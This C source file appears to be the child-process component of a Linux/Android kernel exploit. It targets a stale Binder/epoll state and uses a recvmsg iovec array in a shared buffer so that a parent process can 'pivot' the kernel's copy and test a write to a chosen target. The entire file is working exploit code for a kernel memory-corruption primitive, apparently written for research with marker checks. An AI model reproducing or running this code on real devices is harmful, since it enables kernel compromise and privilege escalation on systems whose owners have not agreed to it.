/* 64-bit child used by the second, conditional Binder primitive.
 *
 * Read main() top to bottom alongside compose.c. The parent owns the
 * stale Binder/epoll state; this child owns the recvmsg iovec. It reports a
 * shared user-buffer address, blocks in recvmsg, then reports exactly what
 * happened. The parent decides whether a checked kernel target may receive
 * the final short marker. No storage operation occurs in this process. */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#define READY_MAGIC UINT64_C(0x4c52454356524459)
#define RESULT_MAGIC UINT64_C(0x4c52454356525354)

struct child_ready {
    uint64_t magic;
    uint64_t user_address;
};

struct child_result {
    uint64_t magic;
    int64_t received;
    int32_t saved_errno;
    uint32_t first16_unchanged;
    uint32_t marker_ok;
    uint8_t first16[16];
};

_Static_assert(sizeof(struct child_ready) == 16, "ready wire layout");
_Static_assert(sizeof(struct child_result) == 48, "result wire layout");

static int write_exact(int fd, const void *data, size_t size) {
    const uint8_t *cursor = data;
    while (size) {
        ssize_t sent = write(fd, cursor, size);
        if (sent < 0 && errno == EINTR) continue;
        if (sent <= 0) return -1;
        cursor += sent;
        size -= (size_t)sent;
    }
    return 0;
}

int main(int argc, char **argv) {
    /* 1. Accept only the descriptors supplied by the parent. The tested
     * boot path uses the shared buffer and "pivot" argument. */
    if (argc != 4 && argc != 5 && argc != 6) return 2;
    const int pivot_mode = argc == 6;
    if (pivot_mode && strcmp(argv[5], "pivot") != 0) return 2;
    char *end = NULL;
    int event_fd = (int)strtol(argv[1], &end, 10);
    if (!end || *end) return 3;
    int recv_fd = (int)strtol(argv[2], &end, 10);
    if (!end || *end) return 3;
    int report_fd = (int)strtol(argv[3], &end, 10);
    if (!end || *end) return 3;

    enum { USER_BUFFER_SIZE = 24, SHARED_MAP_SIZE = 4096 };
    uint8_t local_buffer[USER_BUFFER_SIZE];
    uint8_t *user_buffer = local_buffer;
    if (argc >= 5) {
        int shared_fd = (int)strtol(argv[4], &end, 10);
        if (!end || *end || shared_fd < 0) return 8;
        void *mapping = mmap(NULL, SHARED_MAP_SIZE, PROT_READ | PROT_WRITE,
                             MAP_SHARED, shared_fd, 0);
        if (mapping == MAP_FAILED) return 9;
        user_buffer = mapping;
    }
    memset(user_buffer, '_', USER_BUFFER_SIZE);
    /* 2. Make the original destination observable in both processes. The
     * extra valid buffer lets the first copy establish timing before the
     * parent attempts the stale-iovec pivot. */
    struct iovec vectors[18];
    for (unsigned i = 0; i < 18; ++i) {
        vectors[i].iov_base = user_buffer;
        vectors[i].iov_len = 0;
    }
    vectors[5].iov_len = USER_BUFFER_SIZE;
    if (pivot_mode) {
        memset(user_buffer + 64, 'A', 8);
        memset(user_buffer + 128, 'B', 8);
        vectors[6].iov_base = user_buffer + 64;
        vectors[6].iov_len = 8;
    }
    struct msghdr message;
    memset(&message, 0, sizeof(message));
    message.msg_iov = vectors;
    message.msg_iovlen = 18;
    struct timeval timeout = {.tv_sec = 4, .tv_usec = 0};
    if (setsockopt(recv_fd, SOL_SOCKET, SO_RCVTIMEO,
                   &timeout, sizeof(timeout)) != 0) return 4;

    /* 3. Tell the parent where the original user buffer is, then wait until
     * its second Binder transaction and epoll registration are ready. */
    const struct child_ready ready = {READY_MAGIC, (uint64_t)(uintptr_t)user_buffer};
    if (write_exact(report_fd, &ready, sizeof(ready)) != 0) return 5;
    uint64_t wake = 0;
    if (read(event_fd, &wake, sizeof(wake)) != (ssize_t)sizeof(wake) || wake != 1)
        return 6;

    /* 4. The parent sends control, pivot and possibly final marker bytes.
     * Report the observed copy and keep the decision with the parent. */
    errno = 0;
    ssize_t received = recvmsg(recv_fd, &message, MSG_WAITALL);
    struct child_result result = {0};
    result.magic = RESULT_MAGIC;
    result.received = received;
    result.saved_errno = received < 0 ? errno : 0;
    result.first16_unchanged = 1;
    for (unsigned i = 0; i < 16; ++i)
        if (user_buffer[i] != '_') result.first16_unchanged = 0;
    result.marker_ok = memcmp(user_buffer + 16, "MARKER08", 8) == 0;
    memcpy(result.first16, user_buffer, sizeof(result.first16));
    if (write_exact(report_fd, &result, sizeof(result)) != 0) return 7;
    return 0;
}
